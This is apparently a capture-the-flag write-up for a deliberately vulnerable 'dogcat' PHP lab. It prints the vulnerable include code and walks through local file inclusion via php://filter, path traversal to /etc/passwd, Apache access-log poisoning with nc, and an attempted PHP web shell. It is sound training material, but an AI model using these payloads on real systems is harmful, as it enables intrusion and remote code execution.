DOGCAT
===
- [x] FLAG1

First, I press F12 want to find any clue, but I don'y find.  
Seccond, I press DOG and CAT button, I got a lot cute picture, and I know **view** only allow dog or cat word.
![image](https://user-images.githubusercontent.com/67756786/195544351-dca3ecb7-941a-4f6d-b731-c2a414ddc0cb.png)

Now I try **php wraper** to take web code.
```
http://10.10.162.32//?view=php://filter/convert.base64-encode/resource=dog
```

Got a text base on base64.
![image](https://user-images.githubusercontent.com/67756786/195545334-346cbd14-f4cd-4693-a74c-26a52680e9f3.png)

Decode, and then we know cute picture will be readomly picked out of ten.

![image](https://user-images.githubusercontent.com/67756786/195545544-018317ee-f418-41e9-956d-fdaac5b585d7.png)

Now, we try to take /etc/passwd

```
http://10.10.162.32//?view=php://filter/convert.base64-encode/resource=dog/../../../../etc/passwd
```
First warring message is talk about path error, and it show us path is dog/../../../../etc/passwd.php.
Obviously, web code should be **include(_GET(view).php)**

![image](https://user-images.githubusercontent.com/67756786/195548462-a80629d6-aa6b-4645-b9ac-78ab62662eba.png)

We use %00 to comment that.
Path is correct but still got error.
![image](https://user-images.githubusercontent.com/67756786/195550444-82fc62ef-cd2c-4f00-ae25-ae96617249cc.png)

Now we need to know that the web how to write.

```
http://10.10.162.32//?view=php://filter/convert.base64-encode/resource=dog/../index
```
![image](https://user-images.githubusercontent.com/67756786/195551181-9ca38a4e-946e-4e4f-a94f-7ac00307154e.png)

```html
<!DOCTYPE HTML>
<html>

<head>
    <title>dogcat</title>
    <link rel="stylesheet" type="text/css" href="/style.css">
</head>

<body>
    <h1>dogcat</h1>
    <i>a gallery of various dogs or cats</i>

    <div>
        <h2>What would you like to see?</h2>
        <a href="/?view=dog"><button id="dog">A dog</button></a> <a href="/?view=cat"><button id="cat">A cat</button></a><br>
        <?php
            function containsStr($str, $substr) {
                return strpos($str, $substr) !== false;
            }
	    $ext = isset($_GET["ext"]) ? $_GET["ext"] : '.php';
            if(isset($_GET['view'])) {
                if(containsStr($_GET['view'], 'dog') || containsStr($_GET['view'], 'cat')) {
                    echo 'Here you go!';
                    include $_GET['view'] . $ext;
                } else {
                    echo 'Sorry, only dogs or cats are allowed.';
                }
            }
        ?>
    </div>
</body>

</html>

```

According to index.php source code, we know we have two variable , and we can use GET to change them. 
One of variable, ext, it's default value is .php,No wonder we use /etc/passwd to LFI will get error.

Now we need check /etc/passwd again.
```
http://10.10.162.32//?view=php://filter/convert.base64-encode/resource=dog/../../../../etc/passwd&ext=
```
work!
![image](https://user-images.githubusercontent.com/67756786/195553839-b10f7fb6-023f-4d19-9844-9ffe524981b8.png)

Then we need to find where can excute RCE vulnerable.  
First, confirm what web server

![image](https://user-images.githubusercontent.com/67756786/195554515-62f65ee8-f2d2-4730-b4f6-4a17e62a6bbf.png)

Second, confirm where apache log file
![image](https://user-images.githubusercontent.com/67756786/195555607-9db42cbd-a824-4ea2-8e19-c1785156e75b.png)

Finaly, try to got apache access.log
```
http://10.10.162.32//?view=dog/../../../../var/log/apache2/access&ext=.log
```
Work, nice!
![image](https://user-images.githubusercontent.com/67756786/195556701-5a70e822-e099-4857-9d17-e43fd7adffd4.png)

Now we try access.log can injection or not.
```
echo -e "GET <?php phpinfo(); ?>"| nc 10.10.162.32 80
```
Work
![image](https://user-images.githubusercontent.com/67756786/195557135-6a978839-dad3-4fdd-a902-765dc8206e2f.png)

Now I want put web shell into that.
```
echo -e "GET <?php if(isset($_GET['cmd']))  {  system($_GET['cmd']);  }?>" | nc 10.10.162.32 80
```
But I got this error message, and then I reboot target machine.
![image](https://user-images.githubusercontent.com/67756786/195541111-f95d8e1f-1e61-4993-8f85-7c2c0fa74aa2.png)



- [x] FLAG2
- [x] FLAG3
- [x] FLAG4
